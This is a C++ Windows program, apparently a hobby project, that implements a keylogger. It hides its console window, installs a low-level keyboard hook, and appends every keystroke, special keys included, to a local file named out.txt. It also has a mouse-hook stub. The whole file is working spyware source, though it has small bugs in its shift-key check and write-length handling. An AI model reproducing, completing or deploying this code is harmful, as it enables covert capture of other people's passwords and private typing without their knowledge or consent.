#include <Windows.h>
#include <WinUser.h>
#include <string>
#include <map>

HHOOK _kbHook;
HHOOK _mHook;

KBDLLHOOKSTRUCT kbdStruct;
HANDLE out_file;

std::map<int, std::wstring> specialKeyMap = {
		{VK_BACK, L"[BACKSPACE]"},
		{VK_TAB, L"[TAB]"},
		{VK_RETURN, L"[ENTER]"},
		{VK_CONTROL, L"[CTRL]"},
		{VK_MENU, L"[ALT]"},
		{VK_ESCAPE, L"[ESC]"},
		{VK_PRIOR, L"[PAGE UP]"},
		{VK_NEXT, L"[PAGE DOWN]"},
		{VK_END, L"[END]"},
		{VK_HOME, L"[HOME]"},
		{VK_LEFT, L"[LEFT ARROW]"},
		{VK_UP, L"[UP ARROW]"},
		{VK_RIGHT, L"[RIGHT ARROW]"},
		{VK_DOWN, L"[DOWN ARROW]"},
		{VK_SNAPSHOT, L"[PRINT SCREEN]"},
		{VK_INSERT, L"[INSERT]"},
		{VK_DELETE, L"[DELETE]"},
		{VK_NUMLOCK, L"[NUM LOCK]"},
		{VK_SCROLL, L"[SCROLL LOCK]"},
		{VK_LWIN, L"[LEFT WINDOWS]"},
		{VK_RWIN, L"[RIGHT WINDOWS]"},
		{VK_APPS, L"[APPLICATIONS]"}
};

void initOutFile(std::wstring outFileName) {
	// use new file
	out_file = CreateFileW(outFileName.c_str(), GENERIC_WRITE, FILE_SHARE_WRITE, 0x00, CREATE_NEW, 0x00, 0x00);
	
	// on error fallback to existing file
	if (out_file == INVALID_HANDLE_VALUE) {
		printf("[!] Couldn't open new file, opening existing one.");
		out_file = CreateFileW(outFileName.c_str(), GENERIC_WRITE, FILE_SHARE_WRITE, 0x00, OPEN_EXISTING, 0x00, 0x00);
	}

	// cannot access file - end exec
	if (out_file == INVALID_HANDLE_VALUE) {
		throw ERROR_UNHANDLED_EXCEPTION;
	}
}

DWORD writeBufferToOutFile(std::wstring strToWrite) {
	DWORD dwBytesWritten = 0;
	DWORD dwPos = SetFilePointer(out_file, 0, 0x00, FILE_END);
	LockFile(out_file, dwPos, 0x00, strToWrite.length(), 0x00);
	WriteFile(out_file, strToWrite.c_str(), strToWrite.length(), &dwBytesWritten, 0x00);
	UnlockFile(out_file, dwPos, 0x00, strToWrite.length(), 0);
	FlushFileBuffers(out_file);
	return dwBytesWritten;
}

bool logSpecialKey(int pressedKey, std::wstring& outputString) {
	std::map<int, std::wstring>::const_iterator iterator = specialKeyMap.find(pressedKey);
	if (iterator != specialKeyMap.end()) {
		int size_needed = WideCharToMultiByte(CP_UTF8, 0, iterator->second.c_str(), -1, nullptr, 0, nullptr, nullptr);
		std::wstring utf8_str(size_needed, 0);
		WideCharToMultiByte(CP_UTF8, 0, iterator->second.c_str(), -1, reinterpret_cast<LPSTR>(&utf8_str[0]), size_needed, nullptr, nullptr);
		outputString += utf8_str;
		return true;
	}
	return false;
}

bool isUppercase() {
	// https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate
	// check capslock
	bool res = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0); // check if toggled
	// check shift - all below check if key is down
	return res
		? res
		: (GetKeyState(VK_SHIFT) & 0x1000) != 0
		|| (GetKeyState(VK_LSHIFT) & 0x1000) != 0
		|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0;
}

// Useful -> https://learn.microsoft.com/en-us/windows/win32/fileio/appending-one-file-to-another-file

int saveKeystroke(int keyStroke) {

	// Handle mouse events with separate func
	if (keyStroke == VK_LBUTTON || keyStroke == VK_RBUTTON || keyStroke == VK_MBUTTON) {
		return 0;
	}

	std::wstring writeFileBuf;

	wchar_t key;
	HWND foregroundWindow = GetForegroundWindow();
	HKL layout = 0x00;
	DWORD threadId = GetWindowThreadProcessId(foregroundWindow, 0x00);
	layout = GetKeyboardLayout(threadId);

	if (logSpecialKey(keyStroke, writeFileBuf)) {
		writeBufferToOutFile(writeFileBuf);
		writeFileBuf.clear();
		return 0;
	}
	else {
		key = MapVirtualKeyExW(keyStroke, MAPVK_VK_TO_CHAR, layout);

		// Handles unicode by default
		if (!isUppercase()) {
			key = tolower(key);
		}

		writeFileBuf += key;

		writeBufferToOutFile(writeFileBuf);
		writeFileBuf.clear();
		return 0;
	}
	
}


int saveMouseOnClickEvent() {
	return 0;
}

LRESULT __stdcall keyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN) {
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			saveKeystroke(kbdStruct.vkCode);
		}
	}

	// pass exec to next hook
	return CallNextHookEx(_kbHook, nCode, wParam, lParam);
}

LRESULT __stdcall mouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		// mouse left button
		if (wParam == WM_LBUTTONDOWN) {
			saveMouseOnClickEvent();
		}
	}

	// pass exec to next hook
	return CallNextHookEx(_mHook, nCode, wParam, lParam);
}

// https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
// https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644985(v=vs.85)
// Low-Level hooks used for keyboard / mouse events

void initKbHook() {
	_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, keyboardHookCallback, 0x00, 0x00);
}

void initMHook() {
	_mHook = SetWindowsHookExW(WH_MOUSE_LL, mouseHookCallback, 0x00, 0x00);
}

void releaseHooks() {
	UnhookWindowsHookEx(_kbHook);
	UnhookWindowsHookEx(_mHook);
}

void hideAppWindow() {
	ShowWindow(FindWindowW(L"ConsoleWindowClass", 0x00), 0);
}

int main() {

	std::wstring outFileName = L"out.txt";

	hideAppWindow();
	initOutFile(outFileName);
	initKbHook();

	// run indefinitely
	MSG msg;
	while (GetMessage(&msg, 0x00, 0, 0))
	{
	}
}